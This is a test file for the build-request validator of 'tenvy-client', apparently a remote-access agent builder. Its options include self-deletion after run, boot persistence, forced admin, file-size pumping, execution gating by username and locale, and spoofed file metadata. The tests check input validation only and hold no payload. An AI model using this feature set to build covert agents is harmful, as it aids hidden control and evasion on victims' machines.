import { describe, expect, it } from 'vitest';
import { agentModules } from '../../../../../../shared/modules/index.js';
import { prepareBuildRequest, type BuildRequestInput } from './build-request.js';

function createInput(overrides: Partial<BuildRequestInput> = {}): BuildRequestInput {
	const base: BuildRequestInput = {
		host: 'localhost',
		port: '2332',
		effectiveOutputFilename: 'tenvy-client',
		outputExtension: '.exe',
		targetOS: 'windows',
		targetArch: 'amd64',
		installationPath: '',
		meltAfterRun: false,
		startupOnBoot: false,
		developerMode: true,
		mutexName: '',
		compressBinary: false,
		forceAdmin: false,
		pollIntervalMs: '',
		maxBackoffMs: '',
		shellTimeoutSeconds: '',
		customHeaders: [],
		customCookies: [],
		watchdogEnabled: false,
		watchdogIntervalSeconds: '60',
		enableFilePumper: false,
		filePumperTargetSize: '',
		filePumperUnit: 'MB',
		executionDelaySeconds: '',
		executionMinUptimeMinutes: '',
		executionAllowedUsernames: '',
		executionAllowedLocales: '',
		executionStartDate: '',
		executionEndDate: '',
		executionRequireInternet: true,
		audioStreamingTouched: false,
		audioStreamingEnabled: false,
		fileIconName: null,
		fileIconData: null,
		fileInformation: {
			fileDescription: '',
			productName: '',
			companyName: '',
			productVersion: '',
			fileVersion: '',
			originalFilename: '',
			internalName: '',
			legalCopyright: ''
		},
		isWindowsTarget: true,
		modules: agentModules.map((module) => module.id)
	};

        const modules = overrides.modules ?? base.modules ?? [];

        return {
                ...base,
                ...overrides,
                customHeaders: overrides.customHeaders
                        ? overrides.customHeaders.map((header) => ({ ...header }))
                        : [],
                customCookies: overrides.customCookies
                        ? overrides.customCookies.map((cookie) => ({ ...cookie }))
                        : [],
                fileInformation: overrides.fileInformation
                        ? { ...overrides.fileInformation }
                        : { ...base.fileInformation },
                modules: [...modules]
        };
}

describe('prepareBuildRequest', () => {
	it('rejects requests without a host', () => {
		const result = prepareBuildRequest(createInput({ host: '   ' }));
		expect(result).toEqual({ ok: false, error: 'Host is required.' });
	});

	it('rejects ports outside of the allowed range', () => {
		const result = prepareBuildRequest(createInput({ port: '70000' }));
		expect(result).toEqual({ ok: false, error: 'Port must be between 1 and 65535.' });
	});

	it('rejects watchdog intervals below the minimum threshold', () => {
		const result = prepareBuildRequest(
			createInput({ watchdogEnabled: true, watchdogIntervalSeconds: '4' })
		);
		expect(result).toEqual({
			ok: false,
			error: 'Watchdog interval must be between 5 and 86,400 seconds.'
		});
	});

	it('rejects file pumper payloads that exceed the byte ceiling', () => {
		const result = prepareBuildRequest(
			createInput({
				enableFilePumper: true,
				filePumperTargetSize: '11',
				filePumperUnit: 'GB'
			})
		);
		expect(result).toEqual({
			ok: false,
			error: 'File pumper target size is too large. Maximum supported size is 10 GiB.'
		});
	});

	it('normalizes valid payloads with optional features enabled', () => {
		const result = prepareBuildRequest(
			createInput({
				port: '   ',
				installationPath: '  C:/ProgramData/Tenvy  ',
				mutexName: '  Global\\\\tenvy-demo  ',
				pollIntervalMs: '5000',
				maxBackoffMs: '10000',
				shellTimeoutSeconds: '90',
				watchdogEnabled: true,
				watchdogIntervalSeconds: '120',
				enableFilePumper: true,
				filePumperTargetSize: '1.5',
				filePumperUnit: 'GB',
				executionDelaySeconds: '10',
				executionMinUptimeMinutes: '30',
				executionAllowedUsernames: 'alpha, beta',
				executionAllowedLocales: 'en-US fr-FR',
				executionStartDate: '2024-01-01T00:00:00Z',
				executionEndDate: '2024-01-02T00:00:00Z',
				executionRequireInternet: false,
				customHeaders: [
					{ key: ' X-Test ', value: ' value ' },
					{ key: '', value: 'ignored' }
				],
				customCookies: [
					{ name: ' session ', value: ' token ' },
					{ name: '', value: '' }
				],
				audioStreamingTouched: true,
				audioStreamingEnabled: true,
				fileIconName: 'icon.ico',
				fileIconData: 'base64',
				fileInformation: {
					fileDescription: '  Agent  ',
					productName: '  Tenvy  ',
					companyName: '',
					productVersion: '',
					fileVersion: '',
					originalFilename: '',
					internalName: '',
					legalCopyright: ''
				}
			})
		);

		expect(result.ok).toBe(true);
		if (!result.ok) {
			return;
		}

		expect(result.warnings).toEqual([]);

		const payload = result.payload;
		expect(payload.port).toBe('2332');
		expect(payload.installationPath).toBe('C:/ProgramData/Tenvy');
		expect(payload.mutexName).toBe('Global\\\\tenvy-demo');
		expect(payload.pollIntervalMs).toBe('5000');
		expect(payload.maxBackoffMs).toBe('10000');
		expect(payload.shellTimeoutSeconds).toBe('90');
		expect(payload.watchdog).toEqual({ enabled: true, intervalSeconds: 120 });
		expect(payload.filePumper?.enabled).toBe(true);
		expect(payload.filePumper?.targetBytes).toBe(1610612736);
		expect(payload.executionTriggers).toEqual({
			delaySeconds: 10,
			minUptimeMinutes: 30,
			allowedUsernames: ['alpha', 'beta'],
			allowedLocales: ['en-US', 'fr-FR'],
			requireInternet: false,
			startTime: '2024-01-01T00:00:00.000Z',
			endTime: '2024-01-02T00:00:00.000Z'
		});
		expect(payload.customHeaders).toEqual([{ key: 'X-Test', value: 'value' }]);
		expect(payload.customCookies).toEqual([{ name: 'session', value: 'token' }]);
		expect(payload.audio).toEqual({ streaming: true });
		expect(payload.fileIcon).toEqual({ name: 'icon.ico', data: 'base64' });
		expect(payload.fileInformation).toEqual({
			fileDescription: 'Agent',
			productName: 'Tenvy'
		});
		expect(payload.modules).toEqual(agentModules.map((module) => module.id));
	});

	it('deduplicates and filters module selections', () => {
		const catalog = agentModules.map((module) => module.id);
		const extra = 'non-existent';
		const input = createInput({
			modules: [catalog[0] ?? 'remote-desktop', extra, catalog[0] ?? 'remote-desktop']
		});

		const result = prepareBuildRequest(input);
		expect(result.ok).toBe(true);
		if (!result.ok) {
			return;
		}
		expect(result.payload.modules).toEqual([catalog[0] ?? 'remote-desktop']);
	});
});
